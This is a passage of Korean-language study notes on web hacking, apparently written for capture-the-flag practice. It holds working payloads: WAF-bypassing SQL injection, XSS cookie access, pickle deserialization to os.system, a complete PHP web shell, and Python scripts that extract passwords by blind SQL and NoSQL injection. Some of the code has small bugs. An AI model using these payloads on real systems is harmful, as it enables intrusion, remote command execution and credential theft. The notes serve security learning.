</code></pre></li></ul></li></ul></li><li><p>python 취약점 발생 함수</p><ul><li>eval</li><li>exec</li><li>os.system</li><li>popen</li><li>subprocess.call</li><li>run</li><li>pickle : serialize / deserialize</li><li>yaml : serialize / deserialize<ul><li>Python Object의 <code>__reduce__</code> 메소드를 공격에 사용한다.</li></ul></li></ul></li></ul><h2 id=bypass-waf>bypass WAF<a hidden class=anchor aria-hidden=true href=#bypass-waf>#</a></h2><ul><li><code>WAF(Web Application Firewall)</code> 이란 웹 어플리케이션에 특화된 방화벽으로 각종 공격을 탐지하고 접속을 차단할 수 있다.<ul><li>하지만 WAF는 키워드 기반으로 동작하기 때문에 완벽하지 않다. 키워드 기반 차단 방법의 허점을 노린 공격 방법을 bypass WAF 라 한다.</li></ul></li></ul><ol><li><p>대소문자 검사 미흡</p><ul><li>ex) <code>SeleCt SlEEp(5)</code></li></ul></li><li><p>처리방법 미흡</p><ul><li>ex) select 를 공백으로 치환할 때, <code>seselectect * from users</code> -> <code>select * from users</code></li></ul></li><li><p>문자열 조작함수 감지 미흡</p><ul><li>reverse, concat 등 문자열 조작 함수를 사용한 경우를 고려하지 않은 경우<ul><li>ex) <code>reverse('nimda')</code>, <code>concat('ad', 'min')</code></li></ul></li></ul></li><li><p>연산자 검사 미흡</p><ul><li>연산자를 활용해 true 를 만들어 내어 조건을 우회할 수 있다.<ul><li>ex) <code>|| 1=1</code> -> 이전 조건을 무시하고 전체 조건을 참으로 설정</li></ul></li></ul></li><li><p>공백 대체제 탐지 미흡</p><ul><li>주석을 공백 대신 사용할 수 있다.<ul><li>ex) <code>SELECT/**/name/**/from/**/users</code></li></ul></li><li>` 문자(Backtick)를 활용해서 공백없이 쿼리를 사용할 수 있다.<ul><li>ex) <code>SELECT`name`FROM`user`</code></li></ul></li><li>개행을 활용해 공백을 대체할 수 있다.<ul><li>ex) <code>SELECT\nname\nfrom\nuser</code></li></ul></li><li>탭을 활용해 공백을 대체할 수 있다.<ul><li>ex) <code>SELECT name from user</code></li></ul></li></ul></li><li><p>ASCII코드를 통한 문자열 우회</p><ul><li>ex) <code>SELECT 0x616263</code> 구문은 <code>SELECT abc</code> 와 같다.</li><li>ex) <code>SELECT char(0x61, 0x62, 0x63)</code> 구문은 <code>SELECT abc</code> 와 같다.</li></ul></li><li><p>URL에 쿼리가 들어가는 경우 인코딩을 통한 문자열 우회</p><ul><li><code>%09</code> : \t</li><li><code>%27</code> : '</li><li><code>%2F</code> : /</li><li><code>%5C</code> : \</li><li><code>%2A</code> : *</li><li><code>%20</code> : (공백)</li></ul></li></ol><h2 id=security-misconfiguration>Security Misconfiguration<a hidden class=anchor aria-hidden=true href=#security-misconfiguration>#</a></h2><ul><li>DBMS 시스템 설정을 잘못 세팅한 경우 발생할 수 있는 취약점이다.</li></ul><ol><li>MySQL<ul><li>DBMS에서 <code>my.cnf</code> 파일로 세팅값을 설정한다.<ul><li><code>secure_file_priv</code> 값은 접근 가능한 파일 경로 권한을 설정한다.</li><li><code>select @@secure_file_priv</code> 쿼리로 설정 값을 확인할 수 있다.</li></ul></li></ul></li><li>MSSQL<ul><li><code>SELECT name, value, description FROM sys.configurations WHERE name = 'xp_cmdshell'</code> 구문으로 MSSQL의 취약점을 확인 가능하다.</li><li>윈도우 os cmd 실행 : <code>EXEC xp_cmdshell "net user";</code></li><li>리눅스 os cmd 실행 : <code>EXEC master.dbo.xp_cmdshell 'ls';</code></li></ul></li><li>문자열 비교<ul><li>DBMS마다 대소문자를 같게 취급하거나, 문자열 뒤에 공백이 있어도 같은 문자열로 취급하는 경우가 있다.</li><li>SQLI 방어를 위해 로직을 세팅할 때 우회 방향이 없도록 주의해야 한다.</li></ul></li></ol><h2 id=serialize--deserialize>Serialize / Deserialize<a hidden class=anchor aria-hidden=true href=#serialize--deserialize>#</a></h2><ul><li>직렬화는 객체를 저장하기 위해 string으로 표현하는 것이고, 역직렬화는 string을 객체로 변환하는 작업이다.</li><li>Python 에서 직렬화/역직렬화는 다음과 같이 사용할 수 있다.<pre tabindex=0><code>import pickle
class TestClass:
...

classA = TestClass()
classA_dump = pickle.dumps(classA)  # 직렬화

classA_load = pickle.loads(ClassA_dump)  # 역직렬화
</code></pre></li><li>이때, 역직렬화는 class 안에 있는 <code>def __reduce__(self):</code> 함수를 호출하여 동작하는데, 이 함수를 재정의 하면<ul><li>ex)<pre tabindex=0><code>class TestClass:
  def __reduce__(self):
  	return os.system, (&#34;ls&#34;, )
</code></pre></li></ul></li><li>Redis는 주기적으로 직렬화를 통해 데이터베이스를 저장하고, 그 설정 방법은 아래와 같다.<pre tabindex=0><code>CONFIG set dir /var/tmp/redis  # 파일 저장 위치 설정
CONFIG set dbfilename redis.php  # 저장할 DB와 파일 이름 설정
SAVE  # 저장
</code></pre></li></ul><h1 id=공격-기법>공격 기법<a hidden class=anchor aria-hidden=true href=#공격-기법>#</a></h1><h2 id=innerhtml-을-통한-xss-취약점-공격>innerHTML 을 통한 XSS 취약점 공격<a hidden class=anchor aria-hidden=true href=#innerhtml-을-통한-xss-취약점-공격>#</a></h2><ul><li>조건: 사용자의 입력을 출력하는 형태를 지닌 시스템</li><li>방법: <code>&lt;script></code> 태그와 공격용 javascript 를 url 파라미터 혹은 request 에 포함시켜 공격용 javascript 가 실행되게 한다.</li><li>예시)<ul><li>서버의 코드<pre tabindex=0><code>@app.route(&#34;/vulnerable&#34;)
def vulnerable():
    param = request.args.get(&#34;param&#34;, &#34;&#34;) # 이용자가 입력한 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
</code></pre></li><li>공격자 입력1. 다른 페이지로 redirection<pre tabindex=0><code>&lt;script&gt;location.href = &#34;/another_page?param=PARAM1&#34;;&lt;/script&gt;
</code></pre></li><li>공격자 입력2. cookie 정보 출력<pre tabindex=0><code>&lt;script&gt;document.cookie&lt;/script&gt;
</code></pre></li></ul></li></ul><h2 id=innerhtml-을-통한-xss-취약점-공격2>innerHTML 을 통한 XSS 취약점 공격2<a hidden class=anchor aria-hidden=true href=#innerhtml-을-통한-xss-취약점-공격2>#</a></h2><ul><li>&lt;script> 태그 없이 javascript를 실행시키는 방법</li><li>조건 : 서버에 기본적인 XSS 방지 기법이 적용되어 &lt;script> 태그를 주입시킬 수 없는 경우 (ex: render_template 를 사용한 경우)</li><li>방법 : <code>&lt;image></code> 태그의 <code>onerror</code> 필드에 script를 주입한다.</li><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations>참조</a></li><li>예시)<ul><li>동작하지 않는 script(XSS공격 실패)<pre tabindex=0><code>name = &#34;&lt;script&gt;alert(&#39;I am John in an annoying alert!&#39;)&lt;/script&gt;&#34;;
el.innerHTML = name; // harmless in this case
</code></pre></li><li>동작하는 script (XSS공격 성공)<pre tabindex=0><code>const name = &#34;&lt;img src=&#39;x&#39; onerror=&#39;alert(1)&#39;&gt;&#34;;
el.innerHTML = name; // shows the alert
# x라는 경로에 이미지가 없어서 onerror 로 설정된 javascript가 실행된다.
</code></pre></li></ul></li></ul><h2 id=sql-injection-1>SQL Injection<a hidden class=anchor aria-hidden=true href=#sql-injection-1>#</a></h2><ul><li>조건 : client 인터페이스에서 서버에서 동작할 SQL 쿼리 값을 조작할 수 있다.</li><li>아래 쿼리를 SQL Injection으로 공격하고자 한다면<pre tabindex=0><code>SELECT * FROM users WHERE userid=&#34;{userid}&#34; AND userpassword=&#34;{userpassword}&#34;;
</code></pre></li><li>userid 변수와 userpassword 에 아래와 같은 값이 들어가게 입력을 조작하면 &lsquo;admin&rsquo; 계정을 탈취할 수 있다.<pre tabindex=0><code>/*
ID: admin&#34;--, PW: DUMMY
userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
*/
SELECT * FROM users WHERE userid=&#34;admin&#34;-- &#34; AND userpassword=&#34;DUMMY&#34;

/*
ID: admin&#34; or &#34;1 , PW: DUMMY
userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
*/
SELECT * FROM users WHERE userid=&#34;admin&#34; or &#34;1&#34; AND userpassword=&#34;DUMMY&#34;

/*
ID: admin, PW: DUMMY&#34; or userid=&#34;admin
userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
*/
SELECT * FROM users WHERE userid=&#34;admin&#34; AND userpassword=&#34;DUMMY&#34; or userid=&#34;admin&#34;

/*
ID: &#34; or 1 LIMIT 1,1-- , PW: DUMMY
userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
*/
SELECT * FROM users WHERE userid=&#34;&#34; or 1 LIMIT 1,1-- &#34; AND userpassword=&#34;DUMMY&#34;
</code></pre></li></ul><h2 id=blind-sql-injection>Blind SQL Injection<a hidden class=anchor aria-hidden=true href=#blind-sql-injection>#</a></h2><ul><li>특정 쿼리를 던지고, 쿼리 결과가 존재하는지 여부를 확인하여 password 를 맞춰 나가는 방식</li><li>방법<ul><li>시간 지연 유발<ul><li>RANDOMBLOB(300000000/2)</li><li>SLEEP(10)</li></ul></li><li>화면 결과에서 특정 키워드 검색<ul><li>python beautifulSoup 사용</li><li>python request 모듈로 http request 후 결과의 text 구문 비교</li></ul></li></ul></li><li>글자 위치 추론<pre tabindex=0><code># 첫 번째 글자 구하기
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,1,1)=&#39;a&#39;-- &#39; and upw=&#39;&#39;; # False
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,1,1)=&#39;b&#39;-- &#39; and upw=&#39;&#39;; # True
# 두 번째 글자 구하기
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,2,1)=&#39;d&#39;-- &#39; and upw=&#39;&#39;; # False
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,2,1)=&#39;e&#39;-- &#39; and upw=&#39;&#39;; # True 
</code></pre></li><li>python 자동화<pre tabindex=0><code>#!/usr/bin/python3
import requests
import string
# example URL
url = &#39;http://example.com/login&#39;
params = {
    &#39;uid&#39;: &#39;&#39;,
    &#39;upw&#39;: &#39;&#39;
}
# ascii printables
tc = string.printable
# 사용할 SQL Injection 쿼리
query = &#39;&#39;&#39;admin&#39; and substr(upw,{idx},1)=&#39;{val}&#39;-- &#39;&#39;&#39;
password = &#39;&#39;
# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params[&#39;uid&#39;] = query.format(idx=idx+1, val=ch).strip(&#34;\n&#34;)
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find(&#34;Login success&#34;) != -1:
            password += ch
            break
print(f&#34;Password is {password}&#34;)
</code></pre></li><li>비밀번호 길이 추론 및 확인<ul><li>비밀번호 길이 체크 핵심 : <code>f"((SELECT CHAR_LENGTH(userpassword) WHERE userid=\"{user}\")&lt;{{val}})"</code><ul><li>문자열 인코딩에 따른 정확한 길이 계산을 위해서는 <code>LENGTH</code> 보다 <code>CHAR_LENGTH</code> 함수를 쓰는것이 더 확실하다.</li></ul></li><li>문자열이 한 바이트가 아닐 수도 있으므로 바이트 길이를 따로 계산한다.<pre tabindex=0><code>bit_length = 0
while 1:
  bit_length += 1
  f&#34;SELECT * FROM users WHERE LENGTH(BIN(ORD(SUBSTR(password, {i}, 1)))) = {bit_length}-- -&#34;
</code></pre></li><li>비밀번호 확인 핵심 : <code>f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") &lt; CHAR({{val}}))'</code><ul><li>비밀번호 길이를 구한 후 첫 글짜부터 끝 글짜까지 하나씩 맞춰 나간다.</li><li>ASCII로 표현되지 않는 글자의 경우, bit를 하나씩 맞춰 나가야 하므로 2중 반복문이 필요하다.<pre tabindex=0><code>f&#34;SELECT SUBSTR(BIN(ORD(SUBSTR(password, {i}, 1))), {j}, 1) = &#39;1&#39;-- -&#34;
</code></pre></li><li>전체 bit 를 이어붙인 string 을 담은 &lsquo;bits&rsquo; 변수를 다시 정수 형태로 변경하고, 이를 8byte씩 잘라 big endian 으로 변환하고(길이 계산에 주의), utf-8로 디코딩 한다.<pre tabindex=0><code>for i in range(1, password_length + 1):
  password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, &#34;big&#34;).decode(&#34;utf-8&#34;)
</code></pre></li></ul></li></ul></li><li>python 코드<pre tabindex=0><code>#!/usr/bin/python3
#!/usr/bin/python3
import requests
import sys
from urllib.parse import urljoin


class Exploit:
    # initialization
    def __init__(self, base_url: str) -&gt; None:
        self.base_url = base_url

    def _sqli_by_get(self, url:str) -&gt; str:
        res = requests.get(self.base_url + url)
        print(url)
        return res

    def _sqli_by_post(self, data:str) -&gt; str:
        res = requests.post(self.base_url, data=data)
        print(data)
        return res

    def _binsearch(self, query:str, key_word:str, low:int, high:int) -&gt; int:
        while 1:
            mid = (low + high) // 2
            print(low, mid, high)
            if low + 1 &gt;= high:
                break
            if key_word in self._sqli_by_get(query.format(data_length=mid)).text:  # TODO: 필요에따라 _sqli_by_get 혹은 _sqli_by_post 사용
                high = mid
            else:
                low = mid
        return mid

    # attack methods
    def _find_data_length(self, query: str, key_word:str, max_data_len:int) -&gt; int:
        data_len = self._binsearch(query, key_word, 0, max_data_len)
        return data_len

    def _find_data_bit_length(self, query:str, key_word:str, idx: int) -&gt; str:
        bit_length = 0
        while True:
            bit_length += 1
            if key_word in self._sqli_by_get(query.format(idx=idx, bit_length=bit_length)).text:  # TODO: 필요에따라 _sqli_by_get 혹은 _sqli_by_post 사용
                break
        print(f&#34;{idx}th bit length: {bit_length}&#34;)
        return bit_length

    def _guess_ascii_data(self, query:str, key_word:str, data_len: int) -&gt; str:
        data = &#34;&#34;
        for idx in range(1, data_len + 1):
            pw += chr(self._binsearch(query, key_word, 0x2F, 0x7E))
            print(f&#34;{idx}. {data}&#34;)
        return data

    def _guess_bit_data(self, query1:str, query2:str, key_word:str, data_len: int) -&gt; str:
        decoded_data = &#34;&#34;
        for i in range(data_len + 1):
            bits = &#34;&#34;
            # i번째 데이터가 몇 bit로 이루어진지 확인
            bit_length = self._find_data_bit_length(query1, key_word, i)

            # i번째 데이터를 bit로 변경한 후 값 확인
            for j in range(1, bit_length + 1):
                if key_word in self._sqli_by_get(query2.format(data_idx=i, bit_idx=j)).text:  # TODO: 필요에따라 _sqli_by_get 혹은 _sqli_by_post 사용
                    bits += &#34;1&#34;
                else:
                    bits += &#34;0&#34;
            print(f&#34;bits: {bits}&#34;)
            # bit를 byte 단위로 묶어서 utf-8로 표현
            decoded_data += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, &#34;big&#34;).decode(&#34;utf-8&#34;)
            print(f&#34;data: {decoded_data}&#34;)
        return decoded_data

    def solve(self, length_query:str, bit_length_query:str, guess_query:str, key_word:str, max_data_length:int) -&gt; None:
        # Find the length of data
        data_len = self._find_data_length(length_query, key_word, max_data_length)
        print(f&#34;Length : {data_len}&#34;)
        # Find the exact data
        data = self._guess_bit_data(bit_length_query, guess_query, key_word, data_len)
        print(f&#34;Result : {data}&#34;)


if __name__ == &#34;__main__&#34;:
    port = &#39;10671&#39;
    base_url = f&#39;http://host3.dreamhack.games:{port}/?uid=&#39;

    column_name = &#39;upw&#39;
    # 데이터의 길이가 data_length 인지 확인하기 위함
    length_query = f&#34;admin&#39; AND CHAR_LENGTH({column_name}) &lt; {{data_length}}-- -&#34;
    # idx번째 문자를 bit로 표현했을 때 길이가 bit_length 인지 확인하기 위함
    bit_length_query = f&#34;admin&#39; AND LENGTH(BIN(ORD(SUBSTR({column_name}, {{idx}}, 1)))) = {{bit_length}}-- -&#34;
    # data_idx번째 문자를 bit로 환산하였을 때 bit_idx 위치가 1인지 확인하기 위함
    guess_query = f&#34;admin&#39; and SUBSTR(BIN(ORD(SUBSTR({column_name}, {{data_idx}}, 1))), {{bit_idx}}, 1) = &#39;1&#39;-- -&#34;
    key_word = &#39;exist&#39;
    solver = Exploit(base_url)
  solver.solve(length_query, bit_length_query, guess_query, key_word, 100)
</code></pre></li><li>ex) <code>LIMIT</code> 함수를 이용해 출력 레코드 갯수를 한개로 제한, <code>--</code> 를 통해 뒤쪽 쿼리를 무력화<ul><li><code>SELECT * FROM users WHERE username = '' OR 1=1 LIMIT 0,1 -- ' ;</code></li></ul></li></ul><h2 id=blind-nosql-injection>Blind NoSQL Injection<a hidden class=anchor aria-hidden=true href=#blind-nosql-injection>#</a></h2><ul><li>조건: url로 NoSQL 인자로 object 타입을 대입할 수 있다.</li><li>다음은 MongoDB를 사용하는 시스템에 대한 공격 예시이다.</li><li><code>$regex</code> 구문을 사용하여 정규식으로 문자의 시작 &lsquo;upw&rsquo; 키워드의 첫 글자 확인하는 쿼리<pre tabindex=0><code># http://SERVER_URL?upw[$regex]=^a
&gt; db.user.find({upw: {$regex: &#34;^a&#34;}})
&gt; db.user.find({upw: {$regex: &#34;^b&#34;}})
&gt; db.user.find({upw: {$regex: &#34;^c&#34;}})
...
&gt; db.user.find({upw: {$regex: &#34;^g&#34;}})
{ &#34;_id&#34; : ObjectId(&#34;123456789123456789123456&#34;), &#34;uid&#34; : &#34;guest&#34;, &#34;upw&#34; : &#34;guest&#34; }
</code></pre></li><li><code>$where</code> 와 <code>substring</code> 조합을 활용해 첫 글자를 비교하는 방법<pre tabindex=0><code>&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;a&#39;&#34;})
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;b&#39;&#34;})
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;c&#39;&#34;})
...
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;g&#39;&#34;})
{ &#34;_id&#34; : ObjectId(&#34;123456789123456789123456&#34;), &#34;uid&#34; : &#34;guest&#34;, &#34;upw&#34; : &#34;guest&#34; }
</code></pre><pre tabindex=0><code>&gt; db.user.find({$where:&#34;return 1==1&#34;}) // 전체 레코드 출력
&gt; db.user.find({uid:{$where:&#34;return 1==1&#34;}}) // 에러
</code></pre></li><li>위 조건문을 포함한 쿼리를 DB에 주입시키고 쿼리 실행 결과가 참이라면 공격자가 알아볼 수 있는 동작을 발생시켜야 한다.<ol><li>Time based Injection<ul><li>sleep 함수를 사용하여 응답지연 혹은 timeout을 유발시킨다.<pre tabindex=0><code>&gt; SUBSTRING((SELECT COUNT(*) FROM users WHERE name = &#34;admin&#34;), 1, 1) = &#39;a&#39; AND SLEEP(10);


&gt; SUBSTRING((SELECT COUNT(*) FROM users WHERE name = &#34;admin&#34;), 1, 3) = &#39;abc&#39; AND SLEEP(10);
...
// AND 연산자 특성상 앞 구문이 false(0)이면 SLEEP이 실행되지 않기 때문에 결과를 예측할 수 있다.

&gt; SUBSTRING((SELECT COUNT(*) FROM users WHERE name = &#34;admin&#34;), 1, 2) = &#39;ab&#39; &amp;&amp; SLEEP(10);
// AND 대신 &amp;&amp; 를 사용할 수도 있다.
</code></pre></li><li>아니면 IF문을 직접 사용할 수도 있다.<pre tabindex=0><code>SELECT IF(true, sleep(10), 0);
</code></pre></li><li>BENCHMARK 함수도 실행에 오랜 시간이 걸리기에 시간 지연을 유발할 수 있다.<ul><li>ex) <code>BENCHMARK(40000000, SHA1(1));</code></li></ul></li></ul></li><li>Error based Injection<ul><li>고의로 문법에 맞지않는 구문을 넣어 에러를 발생시킨다.</li></ul><pre tabindex=0><code>&gt; db.user.find({$where: &#34;this.uid==&#39;guest&#39;&amp;&amp;this.upw.substring(0,1)==&#39;g&#39;&amp;&amp;asdf&#34;});
</code></pre><ul><li>asdf 라는 에러가 발생</li><li>debug 모드가 켜져있을 땐 에러에 에러 원인에 관한 구문이 출력되는 것을 이용해 원하는 데이터를 출력할 수도 있다.<ul><li>ex)<pre tabindex=0><code>// SQL의 EXTRACTVALUE 구문과 sub query를 사용하여 비밀번호를 출력시킨다. 
SELECT extractvalue(123, concat(0x3a, (SELECT password FROM users WHERE username=&#39;admin&#39;)));
// 출력된 에러 구문은 다음과 같다. 
ERROR 1105 (HY000): XPATH syntax error: &#39;:123456&#39;
</code></pre></li><li>CTXSYS.DRITHSX.SN, convert, cast 등의함수가 동일한 용도로 사용 될 수 있다.</li></ul></li></ul></li></ol></li><li>python 자동화 코드<ul><li>알파벳의 한 글자씩 &lsquo;ch&rsquo; 변수에 대입하여 전체 &lsquo;flag&rsquo; 를 찾아가는 과정. 비밀번호 포멧이 D?{} 형태임을 알고 있다는 가정 하에 구현</li></ul><pre tabindex=0><code>import requests, string

HOST = &#39;http://localhost&#39;
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = &#39;admin&#39;

flag = &#39;&#39;

for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(f&#39;{HOST}/login?uid[$regex]=ad.in&amp;upw[$regex]=D.{{{flag}{ch}&#39;)
        if response.text == SUCCESS:
            flag += ch
            break

    print(f&#39;FLAG: DH{{{flag}}}&#39;)
</code></pre></li><li>Redis 공격<ul><li>NodeJS에서 Redis 쿼리를 처리하는 라이브러리는 인자의 type에 따라 동작이 달라진다.<ul><li>첫 번쨰 인자가 배열이면 <code>[key, value] => Command(command, key, value)</code> 로 동작한다.</li><li>첫 번째 인자가 문자열이면 <code>key, value, callback => Command(command, [key, value], callback)</code> 로 동작한다.</li><li>이를 이용해 value가 들어가야 할 자리에 [key, value] 를 조합한 배열을 집어넣으면 개발자의 의도와 다른 결과가 발생한다.</li></ul></li><li>Redis는 유효하지 않은 명령어가 입력되어도 다음 명령어를 이어서 수행한다.<ul><li>ex) <code>echo -e "error making string\r\nget data" | nc 127.0.0.1 6379</code> : &lsquo;get data&rsquo; 명령이 수행된다.</li></ul></li></ul></li></ul><h2 id=file-vulnerability-1>File Vulnerability<a hidden class=anchor aria-hidden=true href=#file-vulnerability-1>#</a></h2><ul><li>조건: 임의의 파일을 서버에 업로드하고, 로드할 수 있다.</li><li>아래는 php 의 Web shell 코드 예시이다. 아래를 <code>.php</code> 확장자로 생성하여 서버에 업로드하고, 서버에서 해당 파일을 로드하도록 유도하면 <a href=../web/#CGI-%28Common-Gateway-Interface%29>CGI</a> 에 의해 서버에서 shell 명령어를 동작시킬 수 있다.</li></ul><pre tabindex=0><code>&lt;html&gt;&lt;body&gt;
&lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt;
&lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; autofocus id=&#34;cmd&#34; size=&#34;80&#34;&gt;
&lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt;
&lt;/form&gt;&lt;pre&gt;
&lt;?php
    if(isset($_GET[&#39;cmd&#39;]))
    {
        system($_GET[&#39;cmd&#39;]);
    }
?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre><h2 id=ssrf-server-side-request-forgery-1>SSRF (Server-side Request Forgery)<a hidden class=anchor aria-hidden=true href=#ssrf-server-side-request-forgery-1>#</a></h2><ul><li>조건: local 에서 micro service를 구동하고 특정 port, url로 인터페이스를 구성한 경우</li><li>&ldquo;localhost&rdquo; URL에 대한 필터링 우회<ul><li>127.0.0.1 로 매핑된 도메인 서버 주소를 사용한다.<ul><li>예를들어 &ldquo;*.vcap.me&rdquo; 도메인은 localhost URL로 매핑되어 있다.</li></ul></li><li>127.0.0.1 은 아래와 같이 표현할 수도 있다.<ul><li>0x7f.0x00.0x00.0x01 : 16진수로 풀어쓰기</li><li>0x7f000001 : 16진수로 풀어서 &lsquo;.&rsquo; 생략</li><li>2130706433 : 10진수로 풀어서 &lsquo;.&rsquo; 생략</li><li>127.1 : &lsquo;0.0.&rsquo; 생략</li><li>127.0.1 : &lsquo;0.&rsquo; 생략</li></ul></li><li>URL은 문자의 대소문자를 구별하지 않기 때문에 localhost 문자로만 필터링이 되어있다면 아래와 같이 우회가 가능하다.<ul><li>LocalHost, loCalhost, loaLHost, LOCALHOST</li></ul></li><li>또한 127.0.0.1부터 127.0.0.255 까지의 IP는 루프백(loop-back) 주소라고 하여 모두 로컬 호스트를 가리킨다.</li></ul></li></ul><h2 id=dbms-fingerprinting>DBMS Fingerprinting<a hidden class=anchor aria-hidden=true href=#dbms-fingerprinting>#</a></h2><ul><li>타깃의 DBMS를 확인하는 과정으로, DMBS의 종류와 버전을 알아내는 해킹의 첫 단계를 칭한다.</li></ul><ol><li>쿼리 결과 출력<ul><li><code>@@version</code>, <code>version()</code> 등의 예약어나 함수로 버전 정보를 추출할 수 있다.<ul><li><p>SQLite : sqlite_version() => 3.11.0</p></li><li><p>MSSQL : @@version => Microsoft SQL Server &mldr;.</p></li><li><p>PostgreSQL : version() => PostgreSQL 12.2 (Debian 12.2-2.pgdg100+1) &mldr;</p></li><li><p>mysql : version() => 5.7.29-0ubuntu0.16.04. &mldr;</p></li><li></li></ul></li><li>blind sql injection 기법으로 버전 정보를 하나씩 추론 해 나갈 수도 있다.</li></ul></li><li>에러 출력<ul><li>에러 매시지가 출력된다면, DBMS의 컬럼 명 혹은 테이블 명이 에러 메시지에 포함되도록 유도할 수 있다.</li></ul></li><li>DBMS의 기본 세팅에서 사용하는 포트를 확인하여 DBMS의 종류를 추론할 수 있다.</li></ol><ul><li><p>DBMS마다 데이터베이스 실행에 필요한 주요 정보들을 저장한 System Table 을 보유하고 있고, 여기 든 정보들은 exploit 을 수행하는데 필요한 정보들이다.</p><ul><li>MySQL의 <code>information_schema</code> : MySQL 서버에 존재하는 모든 다른 데이터베이스, 테이블, 컬럼, 인덱스, 권한, 문자셋 등 메타데이터를 저장하고 있는 시스템 데이터베이스로, 데이터를 저장하는 용도가 아니라, &ldquo;데이터에 대한 정보"를 저장하는 가상 데이터베이스이다.<blockquote><p>SCHEMATA: 현재 MySQL 서버에 존재하는 모든 데이터베이스 목록<br>TABLES: 모든 데이터베이스의 테이블 정보 (이름, 타입, 엔진 등). TABLE_SCHEMA는 database를, TABLE_NAME는 database 안의 table을 표시한다.<br>COLUMNS: 모든 테이블의 컬럼 정보 (데이터 타입, NULL 여부, 기본값 등). TABLE_SCHEMA는 database를, TABLE_NAME는 database 안의 table을, COLUMN_NAME은 필드명을 표시한다.<br>STATISTICS: 인덱스 정보<br>KEY_COLUMN_USAGE: 외래 키 관계 정보<br>REFERENTIAL_CONSTRAINTS: 외래 키 제약 조건<br>VIEWS: 뷰(View)에 대한 정의 정보<br>CHARACTER_SETS: 지원하는 문자셋 정보<br>COLLATIONS: 문자셋의 정렬 방식 정보<br>USER_PRIVILEGES: 사용자 권한 목록
TABLE_CONSTRAINTS: PK, FK, UNIQUE 등 제약 조건 정보<br>PROCESSLIST: 현재 연결된 세션/쿼리 정보 (MySQL 8.0부터 PERFORMANCE_SCHEMA로 이동됨)</p></blockquote></li><li>MySQL의 <code>sys</code>: 실행중인 데이터베이스의 접속 및 권한 정보<blockquote><p>SESSION: 현재 접속한 유저의 정보<br>DATABASES: 데이터베이스 목록</p></blockquote></li><li>MySQL의 <code>mysql</code>: mysql 시스템 정보<blockquote><p>USER: 유저의 이름 및 비밀번호 해싱값을 저장</p></blockquote></li><li>MSSQL의 <code>..sysdatabases</code>: 특정 테이블 뒤에 붙여 데이터베이스 목록을 조회할 수 있다.<ul><li>ex) <code>master..sysdatabases</code><ul><li><code>master.dbo.sysdatabases</code> 와 동일한 구문이다.</li></ul></li></ul></li><li>MSSQL에서 <code>DB_NAME(0)</code> : 현재 데이터베이스의 이름</li><li>MSSQL에서 <code>sys.databases</code> : 데이터베이스 목록</li><li>MSSQL에서 <code>..sysobjects </code>: 특정 테이블 뒤에 ..sysobjects를 사용해 테이블에 접근할 수 있다.<ul><li>ex) <code>mytable..sysobjects WHERE xtype = 'U';</code></li><li>xtype = &lsquo;U&rsquo; 는 유저가 정의한 테이블을 의미한다.</li></ul></li><li>MSSQL에서 <code>information_schema.tables</code> : 특정 데이터베이스 뒤에 사용해서 테이블 이름 접근 가능<ul><li>ex) <code>SELECT table_name FROM mydatabase.information_schema.tables;</code></li></ul></li><li>MSSQL에서 <code>syscolumns</code> : database내 테이블의 컬럼들 접근 가능<ul><li>sub query를 사용해서 특정 테이블 내의 컬럼들 확인 가능<ul><li>ex) <code>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'myTable');</code></li></ul></li></ul></li><li>MSSQL에서 <code>information_schema.columns</code> : 특정 데이터베이스 뒤에 사용해서 테이블의 컬럼 접근 가능<ul><li>ex) <code>SELECT table_name, column_name FROM myDatabase.information_schema.columns</code></li></ul></li><li>MSSQL에서 <code>master.sys.sql_logins</code> : 서버의 계정정보<ul><li>ex) <code>SELECT name, password_hash FROM master.sys.sql_logins</code></li></ul></li><li>MSSQL의 <code>master..syslogins</code> : 서버의 계정정보</li></ul></li><li><p>postgreSQL 의 <code>pg_catalog.pg_namespace</code> : 데이터베이스 주요 정보를 포함한 스키마</p><ul><li>ex) <code>postgres=$ select nspname from pg_catalog.pg_namespace;</code></li></ul></li><li><p>postgreSQL 의 <code>information_schema.tables</code> : 데이터베이스 주요 정보를 포함한 테이블 이름</p><ul><li>ex) <code>postgres=$ select table_name, table_name from information_schema.tables where table_schema='pg_catalog';</code></li></ul></li><li><p>postgreSQL 의 <code>information_schema.tables.pg_shadow</code> : 게정정보와 비밀번호 해싱값</p></li><li><p>postgreSQL 의 <code>pg_catalog.pg_settings</code> : DBMS 설정 정보</p></li><li><p>postgreSQL 의 <code>pg_catalog.pg_stat_activity</code> : 실시간 쿼리 